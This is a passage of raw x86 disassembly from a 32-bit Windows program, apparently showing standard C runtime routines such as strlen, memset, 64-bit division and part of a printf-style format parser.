  4055b1:	movzx  eax,WORD PTR [ebp+0x8]
  4055b5:	push   esi
  4055b6:	push   eax
  4055b7:	call   0x409400
  4055bc:	pop    ecx
  4055bd:	pop    ecx
  4055be:	mov    ecx,DWORD PTR [ebp-0x4]
  4055c1:	pop    edi
  4055c2:	pop    esi
  4055c3:	xor    ecx,ebp
  4055c5:	pop    ebx
  4055c6:	call   0x401d11
  4055cb:	leave  
  4055cc:	ret    
  4055cd:	mov    edi,edi
  4055cf:	push   esi
  4055d0:	push   edi
  4055d1:	xor    edi,edi
  4055d3:	lea    esi,[edi+0x40eb40]
  4055d9:	push   DWORD PTR [esi]
  4055db:	call   0x4035a4
  4055e0:	add    edi,0x4
  4055e3:	pop    ecx
  4055e4:	mov    DWORD PTR [esi],eax
  4055e6:	cmp    edi,0x28
  4055e9:	jb     0x4055d3
  4055eb:	pop    edi
  4055ec:	pop    esi
  4055ed:	ret    
  4055ee:	mov    eax,ds:0x40e004
  4055f3:	or     eax,0x1
  4055f6:	xor    ecx,ecx
  4055f8:	cmp    DWORD PTR ds:0x40f7fc,eax
  4055fe:	sete   cl
  405601:	mov    eax,ecx
  405603:	ret    
  405604:	int3   
  405605:	int3   
  405606:	int3   
  405607:	int3   
  405608:	int3   
  405609:	int3   
  40560a:	int3   
  40560b:	int3   
  40560c:	int3   
  40560d:	int3   
  40560e:	int3   
  40560f:	int3   
  405610:	mov    ecx,DWORD PTR [esp+0x4]
  405614:	test   ecx,0x3
  40561a:	je     0x405640
  40561c:	mov    al,BYTE PTR [ecx]
  40561e:	add    ecx,0x1
  405621:	test   al,al
  405623:	je     0x405673
  405625:	test   ecx,0x3
  40562b:	jne    0x40561c
  40562d:	add    eax,0x0
  405632:	lea    esp,[esp+0x0]
  405639:	lea    esp,[esp+0x0]
  405640:	mov    eax,DWORD PTR [ecx]
  405642:	mov    edx,0x7efefeff
  405647:	add    edx,eax
  405649:	xor    eax,0xffffffff
  40564c:	xor    eax,edx
  40564e:	add    ecx,0x4
  405651:	test   eax,0x81010100
  405656:	je     0x405640
  405658:	mov    eax,DWORD PTR [ecx-0x4]
  40565b:	test   al,al
  40565d:	je     0x405691
  40565f:	test   ah,ah
  405661:	je     0x405687
  405663:	test   eax,0xff0000
  405668:	je     0x40567d
  40566a:	test   eax,0xff000000
  40566f:	je     0x405673
  405671:	jmp    0x405640
  405673:	lea    eax,[ecx-0x1]
  405676:	mov    ecx,DWORD PTR [esp+0x4]
  40567a:	sub    eax,ecx
  40567c:	ret    
  40567d:	lea    eax,[ecx-0x2]
  405680:	mov    ecx,DWORD PTR [esp+0x4]
  405684:	sub    eax,ecx
  405686:	ret    
  405687:	lea    eax,[ecx-0x3]
  40568a:	mov    ecx,DWORD PTR [esp+0x4]
  40568e:	sub    eax,ecx
  405690:	ret    
  405691:	lea    eax,[ecx-0x4]
  405694:	mov    ecx,DWORD PTR [esp+0x4]
  405698:	sub    eax,ecx
  40569a:	ret    
  40569b:	mov    edi,edi
  40569d:	push   ebp
  40569e:	mov    ebp,esp
  4056a0:	sub    esp,0x10
  4056a3:	push   ebx
  4056a4:	push   esi
  4056a5:	mov    esi,DWORD PTR [ebp+0xc]
  4056a8:	xor    ebx,ebx
  4056aa:	cmp    esi,ebx
  4056ac:	je     0x4056c3
  4056ae:	cmp    DWORD PTR [ebp+0x10],ebx
  4056b1:	je     0x4056c3
  4056b3:	cmp    BYTE PTR [esi],bl
  4056b5:	jne    0x4056c9
  4056b7:	mov    eax,DWORD PTR [ebp+0x8]
  4056ba:	cmp    eax,ebx
  4056bc:	je     0x4056c3
  4056be:	xor    ecx,ecx
  4056c0:	mov    WORD PTR [eax],cx
  4056c3:	xor    eax,eax
  4056c5:	pop    esi
  4056c6:	pop    ebx
  4056c7:	leave  
  4056c8:	ret    
  4056c9:	push   DWORD PTR [ebp+0x14]
  4056cc:	lea    ecx,[ebp-0x10]
  4056cf:	call   0x402290
  4056d4:	mov    eax,DWORD PTR [ebp-0x10]
  4056d7:	cmp    DWORD PTR [eax+0x14],ebx
  4056da:	jne    0x4056fb
  4056dc:	mov    eax,DWORD PTR [ebp+0x8]
  4056df:	cmp    eax,ebx
  4056e1:	je     0x4056ea
  4056e3:	movzx  cx,BYTE PTR [esi]
  4056e7:	mov    WORD PTR [eax],cx
  4056ea:	cmp    BYTE PTR [ebp-0x4],bl
  4056ed:	je     0x4056f6
  4056ef:	mov    eax,DWORD PTR [ebp-0x8]
  4056f2:	and    DWORD PTR [eax+0x70],0xfffffffd
  4056f6:	xor    eax,eax
  4056f8:	inc    eax
  4056f9:	jmp    0x4056c5
  4056fb:	lea    eax,[ebp-0x10]
  4056fe:	push   eax
  4056ff:	movzx  eax,BYTE PTR [esi]
  405702:	push   eax
  405703:	call   0x4057cc
  405708:	pop    ecx
  405709:	pop    ecx
  40570a:	test   eax,eax
  40570c:	je     0x40578b
  40570e:	mov    eax,DWORD PTR [ebp-0x10]
  405711:	mov    ecx,DWORD PTR [eax+0xac]
  405717:	cmp    ecx,0x1
  40571a:	jle    0x405741
  40571c:	cmp    DWORD PTR [ebp+0x10],ecx
  40571f:	jl     0x405741
  405721:	xor    edx,edx
  405723:	cmp    DWORD PTR [ebp+0x8],ebx
  405726:	setne  dl
  405729:	push   edx
  40572a:	push   DWORD PTR [ebp+0x8]
  40572d:	push   ecx
  40572e:	push   esi
  40572f:	push   0x9
  405731:	push   DWORD PTR [eax+0x4]
  405734:	call   DWORD PTR ds:0x40b148
  40573a:	test   eax,eax
  40573c:	mov    eax,DWORD PTR [ebp-0x10]
  40573f:	jne    0x405751
  405741:	mov    ecx,DWORD PTR [ebp+0x10]
  405744:	cmp    ecx,DWORD PTR [eax+0xac]
  40574a:	jb     0x40576c
  40574c:	cmp    BYTE PTR [esi+0x1],bl
  40574f:	je     0x40576c
  405751:	mov    eax,DWORD PTR [eax+0xac]
  405757:	cmp    BYTE PTR [ebp-0x4],bl
  40575a:	je     0x4056c5
  405760:	mov    ecx,DWORD PTR [ebp-0x8]
  405763:	and    DWORD PTR [ecx+0x70],0xfffffffd
  405767:	jmp    0x4056c5
  40576c:	call   0x4024b6
  405771:	mov    DWORD PTR [eax],0x2a
  405777:	cmp    BYTE PTR [ebp-0x4],bl
  40577a:	je     0x405783
  40577c:	mov    eax,DWORD PTR [ebp-0x8]
  40577f:	and    DWORD PTR [eax+0x70],0xfffffffd
  405783:	or     eax,0xffffffff
  405786:	jmp    0x4056c5
  40578b:	xor    eax,eax
  40578d:	cmp    DWORD PTR [ebp+0x8],ebx
  405790:	setne  al
  405793:	push   eax
  405794:	push   DWORD PTR [ebp+0x8]
  405797:	mov    eax,DWORD PTR [ebp-0x10]
  40579a:	push   0x1
  40579c:	push   esi
  40579d:	push   0x9
  40579f:	push   DWORD PTR [eax+0x4]
  4057a2:	call   DWORD PTR ds:0x40b148
  4057a8:	test   eax,eax
  4057aa:	jne    0x4056ea
  4057b0:	jmp    0x40576c
  4057b2:	mov    edi,edi
  4057b4:	push   ebp
  4057b5:	mov    ebp,esp
  4057b7:	push   0x0
  4057b9:	push   DWORD PTR [ebp+0x10]
  4057bc:	push   DWORD PTR [ebp+0xc]
  4057bf:	push   DWORD PTR [ebp+0x8]
  4057c2:	call   0x40569b
  4057c7:	add    esp,0x10
  4057ca:	pop    ebp
  4057cb:	ret    
  4057cc:	mov    edi,edi
  4057ce:	push   ebp
  4057cf:	mov    ebp,esp
  4057d1:	sub    esp,0x10
  4057d4:	push   DWORD PTR [ebp+0xc]
  4057d7:	lea    ecx,[ebp-0x10]
  4057da:	call   0x402290
  4057df:	movzx  eax,BYTE PTR [ebp+0x8]
  4057e3:	mov    ecx,DWORD PTR [ebp-0x10]
  4057e6:	mov    ecx,DWORD PTR [ecx+0xc8]
  4057ec:	movzx  eax,WORD PTR [ecx+eax*2]
  4057f0:	and    eax,0x8000
  4057f5:	cmp    BYTE PTR [ebp-0x4],0x0
  4057f9:	je     0x405802
  4057fb:	mov    ecx,DWORD PTR [ebp-0x8]
  4057fe:	and    DWORD PTR [ecx+0x70],0xfffffffd
  405802:	leave  
  405803:	ret    
  405804:	mov    edi,edi
  405806:	push   ebp
  405807:	mov    ebp,esp
  405809:	push   0x0
  40580b:	push   DWORD PTR [ebp+0x8]
  40580e:	call   0x4057cc
  405813:	pop    ecx
  405814:	pop    ecx
  405815:	pop    ebp
  405816:	ret    
  405817:	int3   
  405818:	int3   
  405819:	int3   
  40581a:	int3   
  40581b:	int3   
  40581c:	int3   
  40581d:	int3   
  40581e:	int3   
  40581f:	int3   
  405820:	push   esi
  405821:	mov    eax,DWORD PTR [esp+0x14]
  405825:	or     eax,eax
  405827:	jne    0x405851
  405829:	mov    ecx,DWORD PTR [esp+0x10]
  40582d:	mov    eax,DWORD PTR [esp+0xc]
  405831:	xor    edx,edx
  405833:	div    ecx
  405835:	mov    ebx,eax
  405837:	mov    eax,DWORD PTR [esp+0x8]
  40583b:	div    ecx
  40583d:	mov    esi,eax
  40583f:	mov    eax,ebx
  405841:	mul    DWORD PTR [esp+0x10]
  405845:	mov    ecx,eax
  405847:	mov    eax,esi
  405849:	mul    DWORD PTR [esp+0x10]
  40584d:	add    edx,ecx
  40584f:	jmp    0x405898
  405851:	mov    ecx,eax
  405853:	mov    ebx,DWORD PTR [esp+0x10]
  405857:	mov    edx,DWORD PTR [esp+0xc]
  40585b:	mov    eax,DWORD PTR [esp+0x8]
  40585f:	shr    ecx,1
  405861:	rcr    ebx,1
  405863:	shr    edx,1
  405865:	rcr    eax,1
  405867:	or     ecx,ecx
  405869:	jne    0x40585f
  40586b:	div    ebx
  40586d:	mov    esi,eax
  40586f:	mul    DWORD PTR [esp+0x14]
  405873:	mov    ecx,eax
  405875:	mov    eax,DWORD PTR [esp+0x10]
  405879:	mul    esi
  40587b:	add    edx,ecx
  40587d:	jb     0x40588d
  40587f:	cmp    edx,DWORD PTR [esp+0xc]
  405883:	ja     0x40588d
  405885:	jb     0x405896
  405887:	cmp    eax,DWORD PTR [esp+0x8]
  40588b:	jbe    0x405896
  40588d:	dec    esi
  40588e:	sub    eax,DWORD PTR [esp+0x10]
  405892:	sbb    edx,DWORD PTR [esp+0x14]
  405896:	xor    ebx,ebx
  405898:	sub    eax,DWORD PTR [esp+0x8]
  40589c:	sbb    edx,DWORD PTR [esp+0xc]
  4058a0:	neg    edx
  4058a2:	neg    eax
  4058a4:	sbb    edx,0x0
  4058a7:	mov    ecx,edx
  4058a9:	mov    edx,ebx
  4058ab:	mov    ebx,ecx
  4058ad:	mov    ecx,eax
  4058af:	mov    eax,esi
  4058b1:	pop    esi
  4058b2:	ret    0x10
  4058b5:	int3   
  4058b6:	int3   
  4058b7:	int3   
  4058b8:	int3   
  4058b9:	int3   
  4058ba:	int3   
  4058bb:	int3   
  4058bc:	int3   
  4058bd:	int3   
  4058be:	int3   
  4058bf:	int3   
  4058c0:	mov    edx,DWORD PTR [esp+0xc]
  4058c4:	mov    ecx,DWORD PTR [esp+0x4]
  4058c8:	test   edx,edx
  4058ca:	je     0x405935
  4058cc:	xor    eax,eax
  4058ce:	mov    al,BYTE PTR [esp+0x8]
  4058d2:	test   al,al
  4058d4:	jne    0x4058ec
  4058d6:	cmp    edx,0x100
  4058dc:	jb     0x4058ec
  4058de:	cmp    DWORD PTR ds:0x411408,0x0
  4058e5:	je     0x4058ec
  4058e7:	jmp    0x40975d
  4058ec:	push   edi
  4058ed:	mov    edi,ecx
  4058ef:	cmp    edx,0x4
  4058f2:	jb     0x405925
  4058f4:	neg    ecx
  4058f6:	and    ecx,0x3
  4058f9:	je     0x405907
  4058fb:	sub    edx,ecx
  4058fd:	mov    BYTE PTR [edi],al
  4058ff:	add    edi,0x1
  405902:	sub    ecx,0x1
  405905:	jne    0x4058fd
  405907:	mov    ecx,eax
  405909:	shl    eax,0x8
  40590c:	add    eax,ecx
  40590e:	mov    ecx,eax
  405910:	shl    eax,0x10
  405913:	add    eax,ecx
  405915:	mov    ecx,edx
  405917:	and    edx,0x3
  40591a:	shr    ecx,0x2
  40591d:	je     0x405925
  40591f:	rep stos DWORD PTR es:[edi],eax
  405921:	test   edx,edx
  405923:	je     0x40592f
  405925:	mov    BYTE PTR [edi],al
  405927:	add    edi,0x1
  40592a:	sub    edx,0x1
  40592d:	jne    0x405925
  40592f:	mov    eax,DWORD PTR [esp+0x8]
  405933:	pop    edi
  405934:	ret    
  405935:	mov    eax,DWORD PTR [esp+0x4]
  405939:	ret    
  40593a:	mov    edi,edi
  40593c:	push   ebp
  40593d:	mov    ebp,esp
  40593f:	test   BYTE PTR [eax+0xc],0x40
  405943:	je     0x40594b
  405945:	cmp    DWORD PTR [eax+0x8],0x0
  405949:	je     0x405965
  40594b:	push   eax
  40594c:	push   DWORD PTR [ebp+0x8]
  40594f:	call   0x405446
  405954:	pop    ecx
  405955:	pop    ecx
  405956:	mov    ecx,0xffff
  40595b:	cmp    ax,cx
  40595e:	jne    0x405965
  405960:	or     DWORD PTR [esi],0xffffffff
  405963:	pop    ebp
  405964:	ret    
  405965:	inc    DWORD PTR [esi]
  405967:	pop    ebp
  405968:	ret    
  405969:	mov    edi,edi
  40596b:	push   ebp
  40596c:	mov    ebp,esp
  40596e:	push   esi
  40596f:	mov    esi,eax
  405971:	jmp    0x405987
  405973:	push   DWORD PTR [ebp+0x8]
  405976:	mov    eax,DWORD PTR [ebp+0x10]
  405979:	dec    DWORD PTR [ebp+0xc]
  40597c:	call   0x40593a
  405981:	cmp    DWORD PTR [esi],0xffffffff
  405984:	pop    ecx
  405985:	je     0x40598d
  405987:	cmp    DWORD PTR [ebp+0xc],0x0
  40598b:	jg     0x405973
  40598d:	pop    esi
  40598e:	pop    ebp
  40598f:	ret    
  405990:	mov    edi,edi
  405992:	push   ebp
  405993:	mov    ebp,esp
  405995:	test   BYTE PTR [edi+0xc],0x40
  405999:	push   ebx
  40599a:	push   esi
  40599b:	mov    esi,eax
  40599d:	mov    ebx,ecx
  40599f:	je     0x4059d8
  4059a1:	cmp    DWORD PTR [edi+0x8],0x0
  4059a5:	jne    0x4059d8
  4059a7:	mov    eax,DWORD PTR [ebp+0x8]
  4059aa:	add    DWORD PTR [esi],eax
  4059ac:	jmp    0x4059de
  4059ae:	movzx  eax,WORD PTR [ebx]
  4059b1:	dec    DWORD PTR [ebp+0x8]
  4059b4:	push   eax
  4059b5:	mov    eax,edi
  4059b7:	call   0x40593a
  4059bc:	inc    ebx
  4059bd:	inc    ebx
  4059be:	cmp    DWORD PTR [esi],0xffffffff
  4059c1:	pop    ecx
  4059c2:	jne    0x4059d8
  4059c4:	call   0x4024b6
  4059c9:	cmp    DWORD PTR [eax],0x2a
  4059cc:	jne    0x4059de
  4059ce:	push   0x3f
  4059d0:	mov    eax,edi
  4059d2:	call   0x40593a
  4059d7:	pop    ecx
  4059d8:	cmp    DWORD PTR [ebp+0x8],0x0
  4059dc:	jg     0x4059ae
  4059de:	pop    esi
  4059df:	pop    ebx
  4059e0:	pop    ebp
  4059e1:	ret    
  4059e2:	mov    edi,edi
  4059e4:	push   ebp
  4059e5:	mov    ebp,esp
  4059e7:	sub    esp,0x474
  4059ed:	mov    eax,ds:0x40e004
  4059f2:	xor    eax,ebp
  4059f4:	mov    DWORD PTR [ebp-0x4],eax
  4059f7:	push   ebx
  4059f8:	mov    ebx,DWORD PTR [ebp+0x14]
  4059fb:	push   esi
  4059fc:	mov    esi,DWORD PTR [ebp+0x8]
  4059ff:	xor    eax,eax
  405a01:	push   edi
  405a02:	push   DWORD PTR [ebp+0x10]
  405a05:	mov    edi,DWORD PTR [ebp+0xc]
  405a08:	lea    ecx,[ebp-0x44c]
  405a0e:	mov    DWORD PTR [ebp-0x43c],esi
  405a14:	mov    DWORD PTR [ebp-0x418],ebx
  405a1a:	mov    DWORD PTR [ebp-0x454],eax
  405a20:	mov    DWORD PTR [ebp-0x408],eax
  405a26:	mov    DWORD PTR [ebp-0x42c],eax
  405a2c:	mov    DWORD PTR [ebp-0x40c],eax
  405a32:	mov    DWORD PTR [ebp-0x424],eax
  405a38:	mov    DWORD PTR [ebp-0x450],eax
  405a3e:	mov    DWORD PTR [ebp-0x428],eax
  405a44:	call   0x402290
  405a49:	test   esi,esi
  405a4b:	jne    0x405a82
  405a4d:	call   0x4024b6
  405a52:	mov    DWORD PTR [eax],0x16
  405a58:	xor    eax,eax
  405a5a:	push   eax
  405a5b:	push   eax
  405a5c:	push   eax
  405a5d:	push   eax
  405a5e:	push   eax
  405a5f:	call   0x40244e
  405a64:	add    esp,0x14
  405a67:	cmp    BYTE PTR [ebp-0x440],0x0
  405a6e:	je     0x405a7a
  405a70:	mov    eax,DWORD PTR [ebp-0x444]
  405a76:	and    DWORD PTR [eax+0x70],0xfffffffd
  405a7a:	or     eax,0xffffffff
  405a7d:	jmp    0x406551
  405a82:	xor    esi,esi
  405a84:	cmp    edi,esi
  405a86:	jne    0x405a9a
  405a88:	call   0x4024b6
  405a8d:	push   esi
  405a8e:	push   esi
  405a8f:	push   esi
  405a90:	push   esi
  405a91:	mov    DWORD PTR [eax],0x16
  405a97:	push   esi
  405a98:	jmp    0x405a5f
  405a9a:	movzx  ecx,WORD PTR [edi]
  405a9d:	mov    DWORD PTR [ebp-0x420],esi
  405aa3:	mov    DWORD PTR [ebp-0x414],esi
  405aa9:	mov    DWORD PTR [ebp-0x434],esi
  405aaf:	mov    DWORD PTR [ebp-0x458],esi
  405ab5:	mov    DWORD PTR [ebp-0x41c],ecx
  405abb:	cmp    cx,si
  405abe:	je     0x406538
  405ac4:	push   0x2
  405ac6:	pop    edx
  405ac7:	add    edi,edx
  405ac9:	cmp    DWORD PTR [ebp-0x420],esi
  405acf:	mov    DWORD PTR [ebp-0x460],edi
  405ad5:	jl     0x406523
  405adb:	lea    eax,[ecx-0x20]
  405ade:	cmp    ax,0x58
  405ae2:	ja     0x405af3
  405ae4:	movzx  eax,cx
  405ae7:	movzx  eax,BYTE PTR [eax+0x40c3d8]
  405aee:	and    eax,0xf
  405af1:	jmp    0x405af5
  405af3:	xor    eax,eax
  405af5:	mov    esi,DWORD PTR [ebp-0x434]
  405afb:	imul   eax,eax,0x9
  405afe:	movzx  eax,BYTE PTR [eax+esi*1+0x40c3f8]
  405b06:	push   0x8
  405b08:	shr    eax,0x4
  405b0b:	pop    esi
  405b0c:	mov    DWORD PTR [ebp-0x434],eax
  405b12:	cmp    eax,esi
  405b14:	je     0x405a4d
  405b1a:	cmp    eax,0x7
  405b1d:	ja     0x406500
  405b23:	jmp    DWORD PTR [eax*4+0x406562]
  405b2a:	xor    eax,eax
  405b2c:	or     DWORD PTR [ebp-0x40c],0xffffffff
  405b33:	mov    DWORD PTR [ebp-0x45c],eax
  405b39:	mov    DWORD PTR [ebp-0x450],eax
  405b3f:	mov    DWORD PTR [ebp-0x42c],eax
  405b45:	mov    DWORD PTR [ebp-0x424],eax
  405b4b:	mov    DWORD PTR [ebp-0x408],eax
  405b51:	mov    DWORD PTR [ebp-0x428],eax
  405b57:	jmp    0x40650c
  405b5c:	movzx  eax,cx
  405b5f:	sub    eax,0x20
  405b62:	je     0x405bac
  405b64:	sub    eax,0x3
  405b67:	je     0x405b9d
  405b69:	sub    eax,esi
  405b6b:	je     0x405b91
  405b6d:	sub    eax,edx
  405b6f:	je     0x405b85
  405b71:	sub    eax,0x3
  405b74:	jne    0x406500
  405b7a:	or     DWORD PTR [ebp-0x408],esi
  405b80:	jmp    0x40650c
  405b85:	or     DWORD PTR [ebp-0x408],0x4
  405b8c:	jmp    0x40650c
  405b91:	or     DWORD PTR [ebp-0x408],0x1
  405b98:	jmp    0x40650c
  405b9d:	or     DWORD PTR [ebp-0x408],0x80
  405ba7:	jmp    0x40650c
  405bac:	or     DWORD PTR [ebp-0x408],edx
  405bb2:	jmp    0x40650c
  405bb7:	cmp    cx,0x2a
  405bbb:	jne    0x405be8
  405bbd:	mov    eax,DWORD PTR [ebx]
  405bbf:	add    ebx,0x4
  405bc2:	mov    DWORD PTR [ebp-0x418],ebx
  405bc8:	mov    DWORD PTR [ebp-0x42c],eax
  405bce:	test   eax,eax
  405bd0:	jge    0x40650c
  405bd6:	or     DWORD PTR [ebp-0x408],0x4
  405bdd:	neg    DWORD PTR [ebp-0x42c]
  405be3:	jmp    0x40650c
  405be8:	mov    eax,DWORD PTR [ebp-0x42c]
  405bee:	imul   eax,eax,0xa
  405bf1:	movzx  ecx,cx
  405bf4:	lea    eax,[eax+ecx*1-0x30]
  405bf8:	mov    DWORD PTR [ebp-0x42c],eax
  405bfe:	jmp    0x40650c
  405c03:	and    DWORD PTR [ebp-0x40c],0x0
  405c0a:	jmp    0x40650c
  405c0f:	cmp    cx,0x2a
  405c13:	jne    0x405c3a
  405c15:	mov    eax,DWORD PTR [ebx]
  405c17:	add    ebx,0x4
  405c1a:	mov    DWORD PTR [ebp-0x418],ebx
  405c20:	mov    DWORD PTR [ebp-0x40c],eax
  405c26:	test   eax,eax
  405c28:	jge    0x40650c
  405c2e:	or     DWORD PTR [ebp-0x40c],0xffffffff
  405c35:	jmp    0x40650c
  405c3a:	mov    eax,DWORD PTR [ebp-0x40c]
  405c40:	imul   eax,eax,0xa
  405c43:	movzx  ecx,cx
  405c46:	lea    eax,[eax+ecx*1-0x30]
  405c4a:	mov    DWORD PTR [ebp-0x40c],eax
  405c50:	jmp    0x40650c
  405c55:	movzx  eax,cx
  405c58:	cmp    eax,0x49
  405c5b:	je     0x405cae
  405c5d:	cmp    eax,0x68
  405c60:	je     0x405ca2
  405c62:	cmp    eax,0x6c
  405c65:	je     0x405c7f
  405c67:	cmp    eax,0x77
  405c6a:	jne    0x40650c
  405c70:	or     DWORD PTR [ebp-0x408],0x800
  405c7a:	jmp    0x40650c
  405c7f:	cmp    WORD PTR [edi],0x6c
  405c83:	jne    0x405c96
  405c85:	add    edi,edx
  405c87:	or     DWORD PTR [ebp-0x408],0x1000
  405c91:	jmp    0x40650c
  405c96:	or     DWORD PTR [ebp-0x408],0x10
  405c9d:	jmp    0x40650c
  405ca2:	or     DWORD PTR [ebp-0x408],0x20
  405ca9:	jmp    0x40650c
  405cae:	movzx  eax,WORD PTR [edi]
  405cb1:	cmp    ax,0x36
  405cb5:	jne    0x405cd0
  405cb7:	cmp    WORD PTR [edi+0x2],0x34
  405cbc:	jne    0x405cd0
  405cbe:	add    edi,0x4
  405cc1:	or     DWORD PTR [ebp-0x408],0x8000
  405ccb:	jmp    0x40650c
  405cd0:	cmp    ax,0x33
  405cd4:	jne    0x405cef
  405cd6:	cmp    WORD PTR [edi+0x2],0x32
  405cdb:	jne    0x405cef
  405cdd:	add    edi,0x4
  405ce0:	and    DWORD PTR [ebp-0x408],0xffff7fff
  405cea:	jmp    0x40650c
  405cef:	cmp    ax,0x64
  405cf3:	je     0x40650c
  405cf9:	cmp    ax,0x69
  405cfd:	je     0x40650c
  405d03:	cmp    ax,0x6f
  405d07:	je     0x40650c
  405d0d:	cmp    ax,0x75
  405d11:	je     0x40650c
  405d17:	cmp    ax,0x78
  405d1b:	je     0x40650c
  405d21:	cmp    ax,0x58
  405d25:	je     0x40650c
  405d2b:	and    DWORD PTR [ebp-0x434],0x0
  405d32:	mov    eax,DWORD PTR [ebp-0x43c]
  405d38:	push   ecx
  405d39:	lea    esi,[ebp-0x420]
  405d3f:	mov    DWORD PTR [ebp-0x428],0x1
  405d49:	call   0x40593a
  405d4e:	pop    ecx
  405d4f:	jmp    0x40650c
  405d54:	movzx  eax,cx
  405d57:	cmp    eax,0x64
  405d5a:	jg     0x405f90
  405d60:	je     0x406023
  405d66:	cmp    eax,0x53
  405d69:	jg     0x405e8a
  405d6f:	je     0x405def
  405d71:	sub    eax,0x41
  405d74:	je     0x405d86
  405d76:	sub    eax,edx
  405d78:	je     0x405dd3
  405d7a:	sub    eax,edx
  405d7c:	je     0x405d86
  405d7e:	sub    eax,edx
  405d80:	jne    0x406372
  405d86:	add    ecx,0x20
  405d89:	mov    DWORD PTR [ebp-0x45c],0x1
  405d93:	mov    DWORD PTR [ebp-0x41c],ecx
  405d99:	or     DWORD PTR [ebp-0x408],0x40
  405da0:	cmp    DWORD PTR [ebp-0x40c],0x0
  405da7:	lea    esi,[ebp-0x404]
  405dad:	mov    eax,0x200
  405db2:	mov    DWORD PTR [ebp-0x410],esi
  405db8:	mov    DWORD PTR [ebp-0x414],eax
  405dbe:	jge    0x406051
  405dc4:	mov    DWORD PTR [ebp-0x40c],0x6
  405dce:	jmp    0x4060bc
  405dd3:	test   DWORD PTR [ebp-0x408],0x830
  405ddd:	jne    0x405eac
  405de3:	or     DWORD PTR [ebp-0x408],0x20
  405dea:	jmp    0x405eac
  405def:	test   DWORD PTR [ebp-0x408],0x830
  405df9:	jne    0x405e02
  405dfb:	or     DWORD PTR [ebp-0x408],0x20
  405e02:	mov    edi,DWORD PTR [ebp-0x40c]
  405e08:	cmp    edi,0xffffffff
  405e0b:	jne    0x405e12
  405e0d:	mov    edi,0x7fffffff
  405e12:	add    ebx,0x4
  405e15:	test   BYTE PTR [ebp-0x408],0x20
  405e1c:	mov    DWORD PTR [ebp-0x418],ebx
  405e22:	mov    ebx,DWORD PTR [ebx-0x4]
  405e25:	mov    DWORD PTR [ebp-0x410],ebx
  405e2b:	je     0x406336
  405e31:	test   ebx,ebx
  405e33:	jne    0x405e40
  405e35:	mov    eax,ds:0x40eb38
  405e3a:	mov    DWORD PTR [ebp-0x410],eax
  405e40:	and    DWORD PTR [ebp-0x414],0x0
  405e47:	mov    esi,DWORD PTR [ebp-0x410]
  405e4d:	test   edi,edi
  405e4f:	jle    0x406372
  405e55:	mov    al,BYTE PTR [esi]
  405e57:	test   al,al
  405e59:	je     0x406372
  405e5f:	lea    ecx,[ebp-0x44c]
  405e65:	movzx  eax,al
  405e68:	push   ecx
  405e69:	push   eax
  405e6a:	call   0x4057cc
  405e6f:	pop    ecx
  405e70:	pop    ecx
  405e71:	test   eax,eax
  405e73:	je     0x405e76
  405e75:	inc    esi
  405e76:	inc    esi
  405e77:	inc    DWORD PTR [ebp-0x414]
  405e7d:	cmp    DWORD PTR [ebp-0x414],edi
  405e83:	jl     0x405e55
  405e85:	jmp    0x406372
  405e8a:	sub    eax,0x58
  405e8d:	je     0x406183
  405e93:	sub    eax,edx
  405e95:	je     0x405f30
  405e9b:	sub    eax,0x7
  405e9e:	je     0x405d99
  405ea4:	sub    eax,edx
  405ea6:	jne    0x406372
  405eac:	movzx  eax,WORD PTR [ebx]
  405eaf:	add    ebx,0x4
  405eb2:	xor    esi,esi
  405eb4:	inc    esi
  405eb5:	test   BYTE PTR [ebp-0x408],0x20
  405ebc:	mov    DWORD PTR [ebp-0x428],esi
  405ec2:	mov    DWORD PTR [ebp-0x418],ebx
  405ec8:	mov    DWORD PTR [ebp-0x464],eax
  405ece:	je     0x405f12
  405ed0:	mov    BYTE PTR [ebp-0x438],al
  405ed6:	lea    eax,[ebp-0x44c]
  405edc:	push   eax
  405edd:	mov    eax,DWORD PTR [ebp-0x44c]
  405ee3:	mov    BYTE PTR [ebp-0x437],0x0
  405eea:	push   DWORD PTR [eax+0xac]
  405ef0:	lea    eax,[ebp-0x438]
  405ef6:	push   eax
  405ef7:	lea    eax,[ebp-0x404]
  405efd:	push   eax
  405efe:	call   0x40569b
  405f03:	add    esp,0x10
  405f06:	test   eax,eax
  405f08:	jge    0x405f19
  405f0a:	mov    DWORD PTR [ebp-0x450],esi
  405f10:	jmp    0x405f19
  405f12:	mov    WORD PTR [ebp-0x404],ax
  405f19:	lea    eax,[ebp-0x404]
  405f1f:	mov    DWORD PTR [ebp-0x410],eax
  405f25:	mov    DWORD PTR [ebp-0x414],esi
  405f2b:	jmp    0x406372
  405f30:	mov    eax,DWORD PTR [ebx]
  405f32:	add    ebx,0x4
  405f35:	mov    DWORD PTR [ebp-0x418],ebx
  405f3b:	test   eax,eax
  405f3d:	je     0x405f79
  405f3f:	mov    ecx,DWORD PTR [eax+0x4]
  405f42:	test   ecx,ecx
  405f44:	je     0x405f79
  405f46:	test   DWORD PTR [ebp-0x408],0x800
  405f50:	movsx  eax,WORD PTR [eax]
  405f53:	mov    DWORD PTR [ebp-0x410],ecx
  405f59:	je     0x405f6d
  405f5b:	cdq    
  405f5c:	sub    eax,edx
  405f5e:	mov    DWORD PTR [ebp-0x428],0x1
  405f68:	jmp    0x40636a
  405f6d:	and    DWORD PTR [ebp-0x428],0x0
  405f74:	jmp    0x40636c
  405f79:	mov    eax,ds:0x40eb38
  405f7e:	mov    DWORD PTR [ebp-0x410],eax
  405f84:	push   eax
  405f85:	call   0x405610
  405f8a:	pop    ecx
  405f8b:	jmp    0x40636c
  405f90:	cmp    eax,0x70
  405f93:	jg     0x40618f
  405f99:	je     0x40617d
  405f9f:	cmp    eax,0x65
  405fa2:	jl     0x406372
  405fa8:	cmp    eax,0x67
  405fab:	jle    0x405d99
  405fb1:	cmp    eax,0x69
  405fb4:	je     0x406023
  405fb6:	cmp    eax,0x6e
  405fb9:	je     0x405fdf
  405fbb:	cmp    eax,0x6f
  405fbe:	jne    0x406372
  405fc4:	test   BYTE PTR [ebp-0x408],0x80
  405fcb:	mov    DWORD PTR [ebp-0x41c],esi
  405fd1:	je     0x406034
  405fd3:	or     DWORD PTR [ebp-0x408],0x200
  405fdd:	jmp    0x406034
  405fdf:	mov    esi,DWORD PTR [ebx]
  405fe1:	add    ebx,0x4
  405fe4:	mov    DWORD PTR [ebp-0x418],ebx
  405fea:	call   0x4055ee
  405fef:	test   eax,eax
  405ff1:	je     0x405a4d
  405ff7:	test   BYTE PTR [ebp-0x408],0x20
  405ffe:	je     0x40600c
  406000:	mov    ax,WORD PTR [ebp-0x420]
  406007:	mov    WORD PTR [esi],ax
